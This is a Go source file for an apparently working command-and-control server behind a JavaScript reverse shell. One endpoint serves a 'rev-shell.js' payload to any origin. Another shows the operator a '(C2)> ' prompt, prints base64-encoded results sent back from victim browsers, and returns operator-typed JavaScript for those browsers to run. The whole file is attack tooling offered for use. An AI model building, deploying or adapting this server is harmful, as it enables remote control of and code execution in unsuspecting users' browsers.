package main

import (
	"encoding/base64"
	"fmt"
	"github.com/theskibb/sShell/sShell"
	"log"
	"net/http"
	"os"
	"time"
)

func cmdHandler(w http.ResponseWriter, r *http.Request) {

	//get ip address of request
	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = r.RemoteAddr
	}
	//print feedback
	feedbackBase64 := r.URL.Query().Get("res")
	feedback, err := base64.StdEncoding.DecodeString(feedbackBase64)

	if err != nil {
		log.Fatal("could not decode string", err)
	}

	fmt.Println("feedback varible is set to:", string(feedback))
	fmt.Println("recieved req from: ", ip)

	ss := sshell.ShellSettings{
		Promt:   "(C2)> ",
		ExitMsg: "exit",
		Commands: []sshell.Command{
			sshell.Command{
				Input:   "send",
				Handler: sendHandler,
				HelpMsg: "send <output javascript to send>",
			},
		},
		DefaultHandler: func(args []string) string { fmt.Println("could not recognize input"); return "" },
		SingleMode:     true,
	}

	input, err := sshell.StartShell(ss)

	if err != nil {
		log.Fatal("something went wrong with the shell", err)
	}

	enableCors(&w)

	time.Sleep(1 / 2 * time.Second)

	fmt.Fprint(w, input)
}

func sendHandler(args []string) string {
	output := ""

	for _, arg := range args {
		output += arg + " "
	}

	return output
}

func enableCors(w *http.ResponseWriter) {
	(*w).Header().Set("Access-Control-Allow-Origin", "*")
}

func getHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("initialization of reverse shell")

	file, err := os.ReadFile("../js/rev-shell.js")

	if err != nil {
		log.Fatal("could not open file", err)
	}
	script := string(file)

	enableCors(&w)
	fmt.Fprint(w, script)
}

func main() {
	http.HandleFunc("/get", getHandler)
	http.HandleFunc("/", cmdHandler)

	port := ":8080"

	fmt.Println("listening on port", port)
	http.ListenAndServe(port, nil)
}
